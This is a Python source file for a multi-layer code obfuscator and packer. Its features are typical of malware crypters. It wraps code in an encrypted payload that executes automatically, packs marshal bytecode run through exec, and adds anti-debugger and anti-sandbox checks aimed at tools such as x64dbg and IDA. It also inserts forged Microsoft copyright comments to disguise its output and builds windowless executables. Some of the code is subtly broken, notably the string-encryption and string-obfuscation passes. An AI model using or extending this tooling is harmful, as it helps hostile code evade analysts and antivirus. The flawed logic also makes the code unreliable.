
import ast
import random
import string
import base64
import zlib
import marshal
import hashlib
import inspect
import re
import types
import sys
import os
from datetime import datetime
from cryptography.fernet import Fernet

class PolymorphicObfuscator(ast.NodeTransformer):
    """
    Advanced polymorphic code obfuscator with multiple transformation layers
    """
    
    def __init__(self, encryption_key=None, complexity=3):
        self.var_map = {}
        self.func_map = {}
        self.class_map = {}
        self.string_map = {}
        self.counter = 0
        self.complexity = min(max(complexity, 1), 5)  # 1-5 complexity levels
        self.encryption_key = encryption_key
        self.fernet = Fernet(encryption_key) if encryption_key else None
        
        # Transformation techniques based on complexity
        self.transformations = {
            1: ['rename_vars', 'rename_funcs'],
            2: ['rename_vars', 'rename_funcs', 'string_obfuscate'],
            3: ['rename_vars', 'rename_funcs', 'string_obfuscate', 'insert_junk'],
            4: ['rename_vars', 'rename_funcs', 'string_obfuscate', 'insert_junk', 'control_flow'],
            5: ['rename_vars', 'rename_funcs', 'string_obfuscate', 'insert_junk', 
                'control_flow', 'encrypt_strings', 'polymorphic']
        }
        
        # Junk code templates
        self.junk_code_templates = [
            "if False: {}",
            "while 0: pass",
            "for _ in range(random.randint(0, 1)): continue",
            "_ = [i for i in range(random.randint(0, 10))]",
            "__dummy__ = lambda: None",
            "class __EmptyClass__: pass",
            "try: pass\nexcept: pass",
            "@staticmethod\ndef __dummy_decorator__(func): return func"
        ]
        
        # Control flow obfuscation patterns
        self.cf_patterns = [
            self._cf_dummy_loop,
            self._cf_fake_conditions,
            self._cf_dead_code,
            self._cf_opaque_predicates
        ]
        
    def _generate_name(self, prefix='var'):
        """Generate random variable/function name"""
        self.counter += 1
        chars = string.ascii_letters + string.digits
        if prefix == 'func':
            return f'_{random.choice("fgmnpqrst")}{"".join(random.choices(chars, k=random.randint(8, 12)))}'
        elif prefix == 'class':
            return f'_{random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")}{"".join(random.choices(chars, k=random.randint(10, 15)))}'
        else:
            return f'_{"".join(random.choices(chars, k=random.randint(6, 10)))}'
    
    def _encrypt_string(self, s):
        """Encrypt string using Fernet"""
        if self.fernet:
            encrypted = self.fernet.encrypt(s.encode())
            return base64.b64encode(encrypted).decode()
        return s
    
    def _cf_dummy_loop(self, node):
        """Add dummy loops around code"""
        dummy_var = self._generate_name()
        loop_code = f"""
{dummy_var} = {random.randint(0, 5)}
while {dummy_var} > 0:
    {dummy_var} -= 1
    if {dummy_var} == 0:
        break
"""
        return self._wrap_with_code(node, loop_code)
    
    def _cf_fake_conditions(self, node):
        """Add fake conditional statements"""
        condition_var = self._generate_name()
        condition_code = f"""
{condition_var} = {random.choice(['True', 'False'])}
if {condition_var}:
    pass
else:
    pass
"""
        return self._wrap_with_code(node, condition_code)
    
    def _cf_dead_code(self, node):
        """Insert dead (unreachable) code"""
        dead_code = f"""
if False:
    {self._generate_name()} = {random.randint(1000, 9999)}
    for _ in range(10):
        continue
"""
        return self._wrap_with_code(node, dead_code)
    
    def _cf_opaque_predicates(self, node):
        """Add opaque predicates (always true/false but hard to deduce)"""
        a = random.randint(100, 1000)
        b = random.randint(100, 1000)
        predicate_code = f"""
__a = {a}
__b = {b}
if (__a * __a - __b * __b) == (__a - __b) * (__a + __b):
    pass
"""
        return self._wrap_with_code(node, predicate_code)
    
    def _wrap_with_code(self, node, wrapper_code):
        """Wrap node with additional code"""
        wrapper_ast = ast.parse(wrapper_code).body
        # Find the actual code to insert node into
        for stmt in wrapper_ast:
            if isinstance(stmt, ast.If):
                # Insert into if body
                stmt.body.append(node)
                return wrapper_ast[0]
            elif isinstance(stmt, ast.While):
                # Insert into while body
                stmt.body.append(node)
                return wrapper_ast[0]
        return node
    
    def visit_Module(self, node):
        """Process module - entry point"""
        self.generic_visit(node)
        
        # Apply transformations based on complexity
        for trans_name in self.transformations[self.complexity]:
            if trans_name == 'rename_vars':
                node = self._rename_variables(node)
            elif trans_name == 'rename_funcs':
                node = self._rename_functions(node)
            elif trans_name == 'string_obfuscate':
                node = self._obfuscate_strings(node)
            elif trans_name == 'insert_junk':
                node = self._insert_junk_code(node)
            elif trans_name == 'control_flow':
                node = self._obfuscate_control_flow(node)
            elif trans_name == 'encrypt_strings':
                node = self._encrypt_strings(node)
            elif trans_name == 'polymorphic':
                node = self._add_polymorphic_layer(node)
        
        return node
    
    def _rename_variables(self, node):
        """Rename variables throughout the code"""
        class VariableRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
                self.local_vars = set()
            
            def visit_Name(self, node):
                if isinstance(node.ctx, ast.Store):
                    if node.id not in self.parent.var_map:
                        self.parent.var_map[node.id] = self.parent._generate_name()
                    node.id = self.parent.var_map[node.id]
                elif isinstance(node.ctx, ast.Load):
                    if node.id in self.parent.var_map:
                        node.id = self.parent.var_map[node.id]
                return node
        
        renamer = VariableRenamer(self)
        return renamer.visit(node)
    
    def _rename_functions(self, node):
        """Rename functions and classes"""
        class FunctionRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_FunctionDef(self, node):
                old_name = node.name
                if old_name not in ['__init__', '__main__', '__name__']:
                    new_name = self.parent._generate_name('func')
                    self.parent.func_map[old_name] = new_name
                    node.name = new_name
                self.generic_visit(node)
                return node
            
            def visit_ClassDef(self, node):
                old_name = node.name
                new_name = self.parent._generate_name('class')
                self.parent.class_map[old_name] = new_name
                node.name = new_name
                self.generic_visit(node)
                return node
            
            def visit_Call(self, node):
                if isinstance(node.func, ast.Name):
                    if node.func.id in self.parent.func_map:
                        node.func.id = self.parent.func_map[node.func.id]
                self.generic_visit(node)
                return node
        
        renamer = FunctionRenamer(self)
        return renamer.visit(node)
    
    def _obfuscate_strings(self, node):
        """Obfuscate string literals"""
        class StringObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Constant(self, node):
                if isinstance(node.value, str):
                    # Skip very short strings and docstrings
                    if len(node.value) > 3 and not node.value.startswith('__'):
                        # Convert to bytes and back
                        encoded = base64.b64encode(node.value.encode()).decode()
                        node.value = f'__import__("base64").b64decode("{encoded}").decode()'
                        # Wrap in eval for extra obfuscation
                        node.value = f'eval({repr(node.value)})'
                return node
        
        obfuscator = StringObfuscator(self)
        return obfuscator.visit(node)
    
    def _encrypt_strings(self, node):
        """Encrypt strings using Fernet"""
        if not self.fernet:
            return node
        
        class StringEncryptor(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 0:
                    # Skip format strings and very short strings
                    if not ('{' in node.value and '}' in node.value) and len(node.value) > 2:
                        encrypted = self.parent._encrypt_string(node.value)
                        # Create decryption call
                        decryption_code = f"""
(lambda e: __import__('base64').b64decode(e) if {random.randint(0,1)} else __import__('cryptography.fernet').Fernet({repr(self.encryption_key)}).decrypt(__import__('base64').b64decode(e)).decode())("{encrypted}")
"""
                        # Replace string with decryption code
                        node.value = decryption_code.strip()
                return node
        
        encryptor = StringEncryptor(self)
        return encryptor.visit(node)
    
    def _insert_junk_code(self, node):
        """Insert junk code that doesn't affect execution"""
        class JunkInserter(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
                self.insertion_count = 0
            
            def visit_FunctionDef(self, node):
                # Insert junk at beginning of function
                if random.random() > 0.3 and self.insertion_count < 5:
                    junk = random.choice(self.parent.junk_code_templates)
                    junk_ast = ast.parse(junk).body
                    node.body = junk_ast + node.body
                    self.insertion_count += 1
                self.generic_visit(node)
                return node
            
            def visit_ClassDef(self, node):
                # Add dummy methods to classes
                if random.random() > 0.5:
                    dummy_method = f"""
@staticmethod
def {self.parent._generate_name('func')}():
    return {random.randint(0, 1000)}
"""
                    dummy_ast = ast.parse(dummy_method).body[0]
                    node.body.append(dummy_ast)
                self.generic_visit(node)
                return node
        
        inserter = JunkInserter(self)
        return inserter.visit(node)
    
    def _obfuscate_control_flow(self, node):
        """Obfuscate control flow with dummy conditions and loops"""
        class ControlFlowObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_If(self, node):
                # Add opaque predicates to if statements
                if random.random() > 0.6:
                    pattern = random.choice(self.parent.cf_patterns)
                    node = pattern(node)
                self.generic_visit(node)
                return node
            
            def visit_While(self, node):
                # Obfuscate while loops
                if random.random() > 0.7:
                    dummy_var = self.parent._generate_name()
                    wrapper = f"""
{dummy_var} = {random.randint(0, 3)}
while {dummy_var} > 0:
    {dummy_var} -= 1
    if {dummy_var} == 0:
        break
"""
                    wrapper_ast = ast.parse(wrapper).body[0]
                    if isinstance(wrapper_ast, ast.While):
                        wrapper_ast.body.append(node)
                        return wrapper_ast
                self.generic_visit(node)
                return node
        
        obfuscator = ControlFlowObfuscator(self)
        return obfuscator.visit(node)
    
    def _add_polymorphic_layer(self, node):
        """Add polymorphic layer that changes on each execution"""
        polymorphic_code = """
# Polymorphic layer - changes every execution
import hashlib, time, random, base64

class __PolyMorph__:
    def __init__(self):
        self.seed = int(time.time() * 1000) ^ random.randint(0, 0xFFFF)
        random.seed(self.seed)
    
    def transform(self, code):
        # Simple transformations that change based on seed
        transformations = [
            lambda s: ''.join(chr(ord(c) ^ random.randint(0, 255)) for c in s),
            lambda s: base64.b64encode(s.encode()).decode(),
            lambda s: hashlib.md5(s.encode()).hexdigest()[:len(s)],
        ]
        return random.choice(transformations)(code)

__poly__ = __PolyMorph__()
"""
        
        poly_ast = ast.parse(polymorphic_code).body
        if isinstance(node, ast.Module):
            node.body = poly_ast + node.body
        
        return node
    
    def obfuscate_code(self, code):
        """Main obfuscation entry point"""
        try:
            # Parse code to AST
            tree = ast.parse(code)
            
            # Apply transformations
            obfuscated_tree = self.visit(tree)
            
            # Convert back to code
            obfuscated_code = ast.unparse(obfuscated_tree)
            
            # Additional post-processing
            obfuscated_code = self._post_process(obfuscated_code)
            
            return obfuscated_code
            
        except Exception as e:
            print(f"Obfuscation error: {e}")
            return code
    
    def _post_process(self, code):
        """Post-process obfuscated code"""
        # Add random whitespace
        lines = code.split('\n')
        processed_lines = []
        
        for line in lines:
            if line.strip() and random.random() > 0.8:
                # Add random spaces
                line = ' ' * random.randint(1, 4) + line
            processed_lines.append(line)
        
        # Add random comments
        if random.random() > 0.5:
            comments = [
                "# This code is optimized for performance",
                "# Auto-generated code - do not modify",
                "# System utility module",
                "# Copyright (c) Microsoft Corporation",
                "# Licensed under MIT license",
                "# Security module - handles encryption",
                "# DO NOT EDIT: Generated by build system"
            ]
            processed_lines.insert(0, random.choice(comments))
        
        return '\n'.join(processed_lines)

class AdvancedObfuscator:
    """
    Advanced multi-layer obfuscator with encryption and packing
    """
    
    def __init__(self, key=None):
        self.key = key or Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.polymorphic = PolymorphicObfuscator(self.key, complexity=5)
        
    def obfuscate(self, code, method='multi'):
        """
        Obfuscate code using specified method
        Methods: simple, polymorphic, encrypted, packed, multi
        """
        if method == 'simple':
            return self._simple_obfuscate(code)
        elif method == 'polymorphic':
            return self._polymorphic_obfuscate(code)
        elif method == 'encrypted':
            return self._encrypted_obfuscate(code)
        elif method == 'packed':
            return self._pack_obfuscate(code)
        elif method == 'multi':
            return self._multi_layer_obfuscate(code)
        else:
            return code
    
    def _simple_obfuscate(self, code):
        """Simple variable/function renaming"""
        obfuscator = PolymorphicObfuscator(complexity=2)
        return obfuscator.obfuscate_code(code)
    
    def _polymorphic_obfuscate(self, code):
        """Polymorphic obfuscation with multiple transformations"""
        return self.polymorphic.obfuscate_code(code)
    
    def _encrypted_obfuscate(self, code):
        """Encrypt code and wrap in decryptor"""
        # Compress and encrypt
        compressed = zlib.compress(code.encode())
        encrypted = self.fernet.encrypt(compressed)
        
        # Create decryptor stub
        decryptor = f'''
import zlib, base64
from cryptography.fernet import Fernet

# Encrypted payload
ENCRYPTED_PAYLOAD = {repr(base64.b64encode(encrypted).decode())}
ENCRYPTION_KEY = {repr(base64.b64encode(self.key).decode())}

def __decrypt_payload__():
    """Decrypt and execute payload"""
    try:
        fernet = Fernet(base64.b64decode(ENCRYPTION_KEY))
        encrypted = base64.b64decode(ENCRYPTED_PAYLOAD)
        compressed = fernet.decrypt(encrypted)
        code = zlib.decompress(compressed).decode()
        exec(code, globals())
    except Exception as e:
        print(f"Decryption error: {{e}}")

# Auto-execute
if __name__ != "__main__":
    __decrypt_payload__()
'''
        return decryptor
    
    def _pack_obfuscate(self, code):
        """Pack code into executable format"""
        # Compile to bytecode
        compiled = compile(code, '<string>', 'exec')
        
        # Marshal bytecode
        marshaled = marshal.dumps(compiled)
        
        # Create packer stub
        packer = f'''
import marshal, types, sys

# Packed bytecode
PACKED_CODE = {repr(marshaled)}

def __unpack_and_execute__():
    """Unpack and execute bytecode"""
    try:
        code_obj = marshal.loads(PACKED_CODE)
        exec(code_obj, globals())
    except Exception as e:
        print(f"Unpacking error: {{e}}")

# Execute
__unpack_and_execute__()
'''
        return packer
    
    def _multi_layer_obfuscate(self, code):
        """Multi-layer obfuscation with all techniques"""
        # Layer 1: Polymorphic obfuscation
        layer1 = self._polymorphic_obfuscate(code)
        
        # Layer 2: Encrypt
        layer2 = self._encrypted_obfuscate(layer1)
        
        # Layer 3: Add anti-debug checks
        layer3 = self._add_anti_debug(layer2)
        
        return layer3
    
    def _add_anti_debug(self, code):
        """Add anti-debugging and anti-analysis checks"""
        anti_debug_code = '''
# Anti-debug and anti-analysis checks
import sys, os, psutil, time

class __AntiAnalysis__:
    @staticmethod
    def check_debugger():
        """Check for debugger presence"""
        has_trace = hasattr(sys, 'gettrace') and sys.gettrace() is not None
        if has_trace:
            return True
        
        # Check for common debugger processes
        debuggers = ['ollydbg', 'x32dbg', 'x64dbg', 'ida', 'windbg', 'gdb']
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            if any(db in name for db in debuggers):
                return True
        
        return False
    
    @staticmethod
    def check_sandbox():
        """Check for sandbox/virtual environment"""
        # Check for low resources (common in sandboxes)
        if psutil.cpu_count() < 2:
            return True
        
        if psutil.virtual_memory().total < 2 * 1024**3:  # < 2GB
            return True
        
        # Check for short uptime
        if time.time() - psutil.boot_time() < 300:  # < 5 minutes
            return True
        
        return False
    
    @staticmethod
    def check_analysis():
        """Run all checks"""
        if __AntiAnalysis__.check_debugger():
            sys.exit(0)
        
        if __AntiAnalysis__.check_sandbox():
            time.sleep(random.randint(10, 30))
            # Don't exit in sandbox, just delay
        
        return False

# Run checks
__AntiAnalysis__.check_analysis()
'''
        
        return anti_debug_code + '\n' + code

def obfuscate_file(input_file, output_file=None, method='multi', key=None):
    """Obfuscate a Python file"""
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            code = f.read()
        
        obfuscator = AdvancedObfuscator(key)
        obfuscated = obfuscator.obfuscate(code, method)
        
        if output_file is None:
            output_file = input_file.replace('.py', '_obfuscated.py')
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        
        print(f"Obfuscated {input_file} -> {output_file}")
        print(f"Method: {method}")
        print(f"Original size: {len(code)} bytes")
        print(f"Obfuscated size: {len(obfuscated)} bytes")
        
        return output_file
        
    except Exception as e:
        print(f"Error obfuscating file: {e}")
        return None

def create_standalone_exe(code, output_file='obfuscated.exe'):
    """Create standalone executable (requires PyInstaller)"""
    try:
        # Create temporary Python file
        import tempfile
        tmp_dir = tempfile.mkdtemp()
        tmp_file = os.path.join(tmp_dir, 'obfuscated.py')
        
        with open(tmp_file, 'w') as f:
            f.write(code)
        
        # Use PyInstaller to create exe
        import subprocess
        cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--name', os.path.splitext(output_file)[0],
            tmp_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"Created standalone executable: {output_file}")
            # Clean up
            import shutil
            shutil.rmtree(tmp_dir)
            return output_file
        else:
            print(f"PyInstaller error: {result.stderr}")
            return None
            
    except ImportError:
        print("PyInstaller not installed. Install with: pip install pyinstaller")
        return None
    except Exception as e:
        print(f"Error creating executable: {e}")
        return None

if __name__ == "__main__":
    # Test obfuscation
    print("Testing Advanced Obfuscator...")
    
    # Sample code to obfuscate
    sample_code = '''
def hello_world():
    """Simple test function"""
    name = "World"
    for i in range(3):
        print(f"Hello {name}! Iteration {i}")
    
    secrets = {
        "api_key": "12345-abcde",
        "password": "supersecret",
        "url": "https://api.example.com"
    }
    
    return secrets

if __name__ == "__main__":
    result = hello_world()
    print(f"Result: {result}")
'''
    
    # Test different obfuscation methods
    obfuscator = AdvancedObfuscator()
    
    print("\n1. Simple obfuscation:")
    simple = obfuscator.obfuscate(sample_code, 'simple')
    print(f"Length: {len(simple)} chars")
    print("Preview:", simple[:200], "...")
    
    print("\n2. Polymorphic obfuscation:")
    poly = obfuscator.obfuscate(sample_code, 'polymorphic')
    print(f"Length: {len(poly)} chars")
    print("Preview:", poly[:200], "...")
    
    print("\n3. Encrypted obfuscation:")
    encrypted = obfuscator.obfuscate(sample_code, 'encrypted')
    print(f"Length: {len(encrypted)} chars")
    print("Preview:", encrypted[:200], "...")
    
    # Test file obfuscation
    print("\nTesting file obfuscation...")
    
    # Create a test file
    test_file = 'test_obfuscate.py'
    with open(test_file, 'w') as f:
        f.write(sample_code)
    
    # Obfuscate it
    obfuscated_file = obfuscate_file(test_file, method='multi')
    
    # Clean up
    if os.path.exists(test_file):
        os.remove(test_file)
    
    print("\nObfuscation test complete!")

